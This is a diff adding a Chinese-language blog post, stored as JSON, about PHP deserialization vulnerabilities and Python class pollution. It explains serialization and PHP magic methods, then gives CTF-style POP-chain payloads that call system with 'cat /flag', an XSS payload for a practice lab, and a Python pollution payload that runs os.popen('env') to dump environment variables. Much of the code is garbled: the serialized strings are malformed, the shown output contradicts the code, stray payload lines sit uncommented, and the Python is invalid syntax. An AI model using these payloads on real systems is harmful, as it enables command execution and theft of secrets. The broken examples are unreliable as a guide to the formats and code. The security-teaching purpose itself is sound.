@@ -1,0 +1,150 @@
+{
+  "format": "blocks",
+  "no": "013",
+  "category": "网络安全",
+  "title": "序列化漏洞",
+  "date": "2026-08-31",
+  "readingMinutes": 8,
+  "words": 2852,
+  "excerpt": "序列化通俗的意思即是把一个对象变成可以传输的字符串，比如下面的对象：",
+  "body": [
+    {
+      "type": "p",
+      "text": "序列化通俗的意思即是把一个对象变成可以传输的字符串，比如下面的对象："
+    },
+    {
+      "type": "h3",
+      "text": "使用`serialize`函数将一个对象进行序列化"
+    },
+    {
+      "type": "code",
+      "lang": "php",
+      "text": "class Person{\n    var $name;\n    var $height;\n}\n\n$zhangsan = new Person();\n$zhangsan->name = '张三';\n$zhangsan->height = 180;\n# -> 即是给对象属性的赋值\nvar_dump($zhangsan)\n#输出：\n// object(Person)#1 (2){\n//     [\"name\"]=>\n//     string(6) \"张三\"\n//     [\"height\"]=>\n//     NULL\n// }\n\n# 使用serialize函数，将对象序列化\necho serialize($zhangsan)\n# 输出：\n// 0:6:\"Person\":2:{s:4:\"name\";s\"6:\"张三\";s:6:\"height\";i:180(N);}\n# 0表示对象 6表示长度 2表示有两个属性 s表示类型为str 4表示长度 后面接值 N表示null i表示int类型\n"
+    },
+    {
+      "type": "h3",
+      "text": "使用`unserialize`函数把序列化的值变为对象"
+    },
+    {
+      "type": "code",
+      "lang": "php",
+      "text": "$s = '0:6:\"Person\":2:{s:4:\"name\";s\"6:\"张三\";s:6:\"height\";i:180;}'\n$zhangsan = unserialize($s)\nvar_dump($zhangsan)\n# 输出：\n// object(Person)#1 (2){\n//     [\"name\"]=>\n//     string(6) \"张三\"\n//     [\"height\"]=>\n//     int(180)\n// }\n#O:1:\"a\":2:{s:4:\"user\";s:8:\"daydream\";s:4:\"pass\";s:2:\"ok\";}\n\n# O:3:\"syc\":1:{s:4:\"cuit\";O:5:\"lover\":2:{s:3:\"yxx\";O:3:\"web\":2:{s:4:\"eva1\";s:6:\"system\";s:11:\"interesting\";s:9:\"cat /flag\";};s:2:\"QW\";N;};}\n# O:3:\"syc\":1:{s:4:\"cuit\";O:5:\"lover\":2:{s:3:\"yxx\";O:3:\"web\":2:{s:4:\"eva1\";s:6:\"system\";s:11:\"interesting\";s:2:\"ls*\";}s:2:\"QW\";N;}}\nO:3:\"ZZZ\":1:{s:6:\"yuzuha\";O:2:\"Mi\":1:{s:4:\"game\";O:2:\"GI\":1:{s:6:\"furina\";O:5:\"HI3rd\":3:{}}}}\nO:3:\"ZZZ\":1:{s:6:\"yuzuha\";O:2:\"Mi\":1:{s:4:\"game\";O:2:\"GI\":1:{s:6:\"furina\";O:5:\"HI3rd\":3:{s:9:\"RaidenMei\";a:1:{i:0;i:1;}s:5:\"kiana\";a:1:{i:0;i:0;}s:8:\"guanxing\";O:3:\"HSR\":1:{s:5:\"robin\";s:20:\"echo 'PWNED-MARKER';\"}}}}}\neva1 eval\n# O:5:\"lover\":2:{s:3:\"yxx\";s::\"\";s:2:\"QW\";s::\"\";}\n# O:3:\"web\":2:{s:4:\"eval\";s:4:\"eval\";s:11:\"interestig\";s:9:\"cat /flag\";}"
+    },
+    {
+      "type": "p",
+      "text": "序列化反序列化本身是没问题的，但是php中存在一些魔法函数，会在对象的生命周期过程中被调用"
+    },
+    {
+      "type": "p",
+      "text": "例如："
+    },
+    {
+      "type": "code",
+      "lang": "php",
+      "text": "class Person{\n    var $name;\n    var $height;\n\n    function __construct(){\n        echo 'Person被创建了\\n';\n    }\n}\n\nnew Person();\n# 输出：\n// Person被创建了\n// object(Person)#1 (2){\n//     [\"name\"]=>\n//     string(6) \"张三\"\n//     [\"height\"]=>\n//     int(180)\n// }"
+    },
+    {
+      "type": "p",
+      "text": "类似的常见魔法函数有："
+    },
+    {
+      "type": "list",
+      "ordered": false,
+      "items": [
+        {
+          "text": "`__construct()` - 对象创建时调用",
+          "level": 0
+        },
+        {
+          "text": "`__destruct()` - 对象销毁时调用（脚本结束、unset、引用计数为0）",
+          "level": 0
+        },
+        {
+          "text": "`__call()` - 调用不存在或不可访问的对象方法时",
+          "level": 0
+        },
+        {
+          "text": "`__callStatic()` - 调用不存在或不可访问的静态方法时",
+          "level": 0
+        },
+        {
+          "text": "`__get()` - 读取不存在或不可访问的属性时",
+          "level": 0
+        },
+        {
+          "text": "`__set()` - 给不存在或不可访问的属性赋值时",
+          "level": 0
+        },
+        {
+          "text": "`__isset()` - 对不存在或不可访问的属性使用 `isset()/empty()` 时",
+          "level": 0
+        },
+        {
+          "text": "`__unset()` - 对不存在或不可访问的属性使用 `unset()` 时",
+          "level": 0
+        },
+        {
+          "text": "`__sleep()` - `serialize()` 之前调用",
+          "level": 0
+        },
+        {
+          "text": "`__wakeup()` - `unserialize()` 之后调用",
+          "level": 0
+        },
+        {
+          "text": "`__serialize()` - PHP 7.4+，`serialize()` 之前调用，替代 `__sleep()`",
+          "level": 0
+        },
+        {
+          "text": "`__unserialize()` - PHP 7.4+，unserialize() 时调用，替代 __wakeup()",
+          "level": 0
+        },
+        {
+          "text": "`__toString()` - 对象被当作字符串使用时（echo、字符串拼接、strcmp等）",
+          "level": 0
+        },
+        {
+          "text": "`__invoke()` - 对象被当作函数调用时",
+          "level": 0
+        },
+        {
+          "text": "`__set_state()` - var_export() 导出对象后，用 eval() 恢复时",
+          "level": 0
+        },
+        {
+          "text": "`__clone()` - 对象被 clone 时",
+          "level": 0
+        },
+        {
+          "text": "`__autoload()` - 已废弃，类找不到时自动加载",
+          "level": 0
+        },
+        {
+          "text": "`__debugInfo()` - var_dump()/print_r() 时控制输出",
+          "level": 0
+        }
+      ]
+    },
+    {
+      "type": "p",
+      "text": "这些是php内置的，而我们可以重写这些方法，让对象在序列化和反序列化的过程中执行我们想执行的代码"
+    },
+    {
+      "type": "h3",
+      "text": "反序列化配合XSS示例"
+    },
+    {
+      "type": "p",
+      "text": "以pikachu靶场为例：\n输入序列化后的字符，页面会将属性值打印到页面上，那么之间把属性值写为`<script>alert(1)</script>`即可触发XSS"
+    },
+    {
+      "type": "h2",
+      "text": "python原型链污染"
+    },
+    {
+      "type": "code",
+      "lang": "python",
+      "text": "class shangxiao (father):\n    __init__():\n\n    self.weapon=\"spear\"\n\n    self.tactic=\"ambush\"\n\n    __del__():\n      pass\n\n\nclass father (person):\n    __init__():\n\n\nclass person :\n    __init__():\n\n    self.execute_method=lambda executor,target:(target.__del__(),setattr(target,'alive',False),__import__('os').popen('env').read())\n\n\n    {\"__class__\":{\"__base__\":{\"__base__\":{\"execute_method\":\"lambda executor,target:(target.__del__(),setattr(target,'alive',False),__import__('os').popen('env').read())\"}}}}\n"
+    }
+  ]
+}
